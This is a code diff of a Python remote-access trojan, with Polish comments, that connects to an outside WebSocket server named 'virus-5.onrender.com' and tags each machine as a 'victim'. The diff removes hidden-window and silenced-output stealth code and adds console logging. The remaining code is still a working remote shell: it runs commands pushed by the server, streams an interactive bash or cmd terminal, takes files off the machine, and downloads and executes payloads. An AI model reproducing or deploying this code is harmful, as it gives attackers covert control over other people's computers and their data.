@@ -9,33 +9,15 @@ import threading
 import select
 import sys
 
-
-# ─── Tryb ukryty ────────────────────────────────────────────────
-# Przekieruj stdout/stderr do /dev/null żeby nic nie wyświetlać
-if not sys.stdout or not sys.stdout.isatty():
-    pass  # już przekierowane
-try:
-    devnull = open(os.devnull, 'w')
-    sys.stdout = devnull
-    sys.stderr = devnull
-except Exception:
-    pass
-
-# Flagi dla subprocess — ukrycie okna na Windows
-if platform.system() == "Windows":
-    CREATION_FLAGS = 0x08000000  # CREATE_NO_WINDOW
-else:
-    CREATION_FLAGS = 0
-# ────────────────────────────────────────────────────────────────
-
 try:
     from websocket import create_connection, WebSocketConnectionClosedException
 except ImportError:
+    print("Brak biblioteki websocket-client. Instaluję...")
     os.system("pip install websocket-client")
     from websocket import create_connection, WebSocketConnectionClosedException
 
 # ─── Konfiguracja ───────────────────────────────────────────────
-SERVER_URL = "wss://virus-6.onrender.com/victim"
+SERVER_URL = "wss://virus-5.onrender.com"
 VICTIM_ID = f"{socket.gethostname()}-{platform.system()}"
 RECONNECT_DELAY = 5
 DOWNLOAD_DIR = tempfile.gettempdir()  # Folder na pobrane pliki
@@ -59,7 +41,8 @@ def handle_terminal_start(ws):
     try:
         shell_cmd = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
 
-        popen_kwargs = dict(
+        terminal_process = subprocess.Popen(
+            shell_cmd,
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
@@ -67,16 +50,9 @@ def handle_terminal_start(ws):
             bufsize=0,
             cwd=os.path.expanduser("~")
         )
-        if platform.system() == "Windows":
-            popen_kwargs["creationflags"] = CREATION_FLAGS
-            startupinfo = subprocess.STARTUPINFO()
-            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            startupinfo.wShowWindow = 0  # SW_HIDE
-            popen_kwargs["startupinfo"] = startupinfo
-
-        terminal_process = subprocess.Popen(shell_cmd, **popen_kwargs)
 
         ws.send(json.dumps({"type": "terminal_started", "shell": shell_cmd, "pid": terminal_process.pid}))
+        print(f"  [⌨] Terminal uruchomiony: {shell_cmd} (PID {terminal_process.pid})")
 
         # Wątek czytający output z procesu i wysyłający do serwera
         def reader():
@@ -138,6 +114,7 @@ def handle_terminal_stop(ws):
             except Exception:
                 pass
         terminal_process = None
+        print("  [⌨] Terminal zamknięty")
 
 
 def handle_shell(ws, data):
@@ -148,20 +125,14 @@ def handle_shell(ws, data):
         return
 
     try:
-        run_kwargs = dict(
+        result = subprocess.run(
+            command,
             shell=True,
             capture_output=True,
             text=True,
             timeout=30,
             cwd=os.path.expanduser("~")
         )
-        if platform.system() == "Windows":
-            run_kwargs["creationflags"] = CREATION_FLAGS
-            si = subprocess.STARTUPINFO()
-            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            si.wShowWindow = 0
-            run_kwargs["startupinfo"] = si
-        result = subprocess.run(command, **run_kwargs)
         output = result.stdout + result.stderr
         if not output:
             output = "(brak wyjścia)"
@@ -197,6 +168,8 @@ def handle_binary(ws, raw_data):
     try:
         with open(filepath, "wb") as f:
             f.write(raw_data)
+        msg = f"Zapisano plik: {filepath} ({len(raw_data)} bajtów)"
+        print(f"  [✓] {msg}")
         ws.send(json.dumps({"type": "upload_done", "filepath": filepath, "size": len(raw_data)}))
     except Exception as e:
         ws.send(json.dumps({"type": "error", "msg": f"Nie można zapisać pliku: {e}"}))
@@ -220,6 +193,7 @@ def handle_download(ws, data):
         # Potem dane binarne
         with open(filepath, "rb") as f:
             ws.send_binary(f.read())
+        print(f"  [↑] Wysłano plik: {filepath} ({filesize} B)")
     except Exception as e:
         ws.send(json.dumps({"type": "error", "msg": f"Błąd odczytu pliku: {e}"}))
 
@@ -236,19 +210,13 @@ def handle_execute(ws, data):
         if platform.system() != "Windows":
             os.chmod(filepath, 0o755)
 
-        exec_kwargs = dict(
+        result = subprocess.run(
+            filepath,
             shell=True,
             capture_output=True,
             text=True,
             timeout=60
         )
-        if platform.system() == "Windows":
-            exec_kwargs["creationflags"] = CREATION_FLAGS
-            si = subprocess.STARTUPINFO()
-            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            si.wShowWindow = 0
-            exec_kwargs["startupinfo"] = si
-        result = subprocess.run(filepath, **exec_kwargs)
         output = result.stdout + result.stderr
         if not output:
             output = "(brak wyjścia, kod: {})".format(result.returncode)
@@ -258,6 +226,7 @@ def handle_execute(ws, data):
             "filepath": filepath,
             "output": output[:50000]
         }))
+        print(f"  [▶] Wykonano: {filepath}")
     except subprocess.TimeoutExpired:
         ws.send(json.dumps({"type": "execute_result", "filepath": filepath, "output": "(timeout)"}))
     except Exception as e:
@@ -270,7 +239,9 @@ def connect_loop():
 
     while True:
         try:
+            print(f"[*] Łączenie z {url} ...")
             ws = create_connection(url)
+            print(f"[+] Połączono jako '{VICTIM_ID}'")
 
             # Powitanie
             ws.send(json.dumps({
@@ -298,6 +269,7 @@ def connect_loop():
                     continue
 
                 msg_type = data.get("type", "")
+                print(f"  [←] Polecenie: {msg_type}")
 
                 if msg_type == "shell":
                     handle_shell(ws, data)
@@ -317,12 +289,13 @@ def connect_loop():
                     ws.send(json.dumps({"type": "error", "msg": f"Nieznany typ: {msg_type}"}))
 
         except WebSocketConnectionClosedException:
-            pass
+            print("[!] Serwer zamknął połączenie")
         except ConnectionRefusedError:
-            pass
-        except Exception:
-            pass
+            print("[!] Odmowa połączenia")
+        except Exception as e:
+            print(f"[!] Błąd: {e}")
 
+        print(f"[*] Ponowna próba za {RECONNECT_DELAY}s ...")
         time.sleep(RECONNECT_DELAY)
 
 
